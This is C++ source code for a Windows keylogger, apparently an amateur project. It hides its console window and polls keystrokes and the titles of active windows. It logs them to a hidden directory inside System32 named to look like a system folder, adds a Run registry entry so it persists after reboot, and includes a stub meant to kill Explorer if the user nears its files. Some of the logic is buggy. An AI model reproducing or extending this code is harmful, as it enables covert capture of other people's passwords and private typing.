// KeyLogger.cpp : Defines the entry point for the console application.
// note: the pathes in windows needs to be with \\ (double backslash) because one back slash
//doesn't count (check why ?!)

#include "stdafx.h"
#include <fstream>
#include <Windows.h>
#include <string>
#include <iostream>
#include <winuser.h>
using namespace std;


//global vars
ofstream keylogFileStream;
ifstream adminFileStream;
string buffer;
int counter;
bool wasKeyPressed[256] = { false };//for indicating if key was pressed before the getAsyncKeyState
bool adminChecker,space,enter=false;

//array for keys
char virtualKEYS[] ="ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
char withoutSf[] = "abcdefghijklmnopqrstuvwxyz0123456789";
char withShift[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ)!@#$%^&*(";
char window[40]="";//used to get current window's context title
char directoryName[] = "C:\\Windows\\System32\\windowsLib";//directory of all files
char directoryName2[] = "C:\\Windows\\System32\\Internal";
string keyLogTextFile = "C:\\Windows\\System32\\windowsLib"  "\\keylog.txt";

string adminTextFile = "C:\\Windows\\System32\\windowsLib"  "\\admin.txt";

//add the pressed key to the buffer
void keylist(char key,bool shift,int index){
	//check if the key is pressed
	SHORT x = GetAsyncKeyState(key);
	if ((x & (1 << 15)) != 0){
		if (wasKeyPressed[index] == false){
		if (shift){
				buffer.append(string(1, withShift[index]));//we can  use +=
			}
			else{
				buffer.append(string(1, withoutSf[index]));//we can  use +=
			}
			counter++;  
		}
		wasKeyPressed[index] = true;
		space = false;//because another key is clicked
		enter = false;//because another key is clicked
	}
	else{
		wasKeyPressed[index] = false;
	}
}

//checker for special keys
void sKeyChecker(){
	if ((GetAsyncKeyState(VK_SPACE)& (1 << 15))!=0){// for space
		if (space == false){
			buffer.append(" ");
			counter++;
			space = true;
		}
	}
	else{
		space = false;
	}
	if ((GetAsyncKeyState(VK_RETURN)& (1 << 15)) != 0){//for enter
		if (space == false){
			buffer.append("\n");
			counter++;
			space = true;
		}
	}
	else{
		space = false;
	}
}

//this function checks if shift pressed
bool shiftChecker(){
	SHORT x = GetAsyncKeyState(VK_SHIFT);
	return (x & (1 << 15)) != 0; // if the most significant bit set= the key is pressed down now
}

/* this function prints  the context window we are in*/
void windowChecker(){
	char temp[40];
	 GetWindowTextA(GetForegroundWindow(),temp,sizeof(temp));
	 if (strcmp(temp,window)){
		 strcpy_s(window, temp);
		 keylogFileStream.open(keyLogTextFile, ios::out | ios::app);
		 keylogFileStream << " ** " << window << " ** " << endl;
		 keylogFileStream.close();//close to save
	 }
}

//change hosts file
void changeHostsFile(string processName){
	
}



/* dummy for killing a process ( this will later use 
to kill file explorer process if the user enters the malware directory)
*/
void killProcess(string processName){
	if (processName.length >= 2){
		//int returnCode = system(processName.c_str());
		//dummy test
		int returnCode = system("taskkill /T /F /IM notepad.exe"); // kill  process and all his childs with force muhahaha...
	}
}


//this function hides the console window
void hideConsole(){//this how gamma hided there blackbox command prompt line 
	HWND Stealth;//HWND is a pointer with values that points to a window structure (Window handler)
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0); 
}

//this function adds registery key to Run (for start up after reboot) ** NOW ITS ONLY DUMMY**
void registerToStartUp(){
	HKEY keyPointer;//handler key
	LPCWSTR subKeyName = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run\\";// long const. pointer to the key's path
	if (RegOpenKey(HKEY_CURRENT_USER, subKeyName, &keyPointer) == ERROR_SUCCESS)
	{
		const BYTE * value = (LPBYTE) "test";//new subKey name
		LPCWSTR keyName = L"Windows Cool";//subKey's value (the path to executable)
		LONG finishVal = RegSetValueEx(keyPointer, keyName, 0, REG_SZ, value, sizeof(value));
		RegCloseKey(keyPointer);//close to finish process properly(save)
	}
}

bool isAdmin(){//check for NT AUTHORITY = 5 in SID
	string command = "whoami /user > " + adminTextFile;//output to file
	int outputCode = system(command.c_str());
	const char * test = command.c_str();
	adminFileStream.open(string(adminTextFile,sizeof(adminTextFile)), ios::in);
	string output;
	adminFileStream >> output;
	// check now if admin
	if (output.find("S-1-5"))
	{
		//this is a user
		if (output.find("-1000")){
			//has admin privilegis
			return true;
		}
	}
	return true;
}


void createDirectory(){
//could be done in same way with createDirectory(path,null)
	string command = "mkdir " + string(directoryName, sizeof(directoryName));
	system(command.c_str());
//simple trial&error check if file created...

	GetFileAttributes(L"C:\\Windows\\System32\\windowsLib");
	int errorCode = GetLastError();//the last error code that occured in the main thread
	if (errorCode == ERROR_FILE_NOT_FOUND)
	{
		cout << " I'm fucked until i figure out how to deal with it" << endl;
	}
	if (errorCode == ERROR_INVALID_NAME){//change the file name and hope it will work
		command = "mkdir " + string(directoryName2, sizeof(directoryName2));
		system(command.c_str());
		//... continue the failure checking later..
	}
	//set file to hidden (suppose our first attempt succeeded)
	SetFileAttributes(L"C:\\Windows\\System32\\windowsLib", FILE_ATTRIBUTE_HIDDEN);
}



int _tmain(int argc, _TCHAR* argv[])
{
	hideConsole();
	adminChecker = isAdmin();
	if (adminChecker){
		registerToStartUp();
		createDirectory();
	}
	
	

	bool isShiftPressed;

	//check the key state
	while (true){
		windowChecker();
		isShiftPressed = shiftChecker();

		for (int i = 0; i < sizeof(virtualKEYS); ++i){
			keylist(virtualKEYS[i],isShiftPressed,i);
		}
	  sKeyChecker();
		if (counter == 15){
		
            // ios::app for telling at the indicator to go to 
			// the end of the file for each uotput operation
		
			keylogFileStream.open(string(keyLogTextFile, sizeof(keyLogTextFile)), ios::out | ios::app);
			keylogFileStream << buffer;
			cout << buffer;
			buffer = "";
			keylogFileStream.close();//close to save
			counter = 0;
		}
		Sleep(50);//sleep for checking every 50ms
	}

	return 0;
}

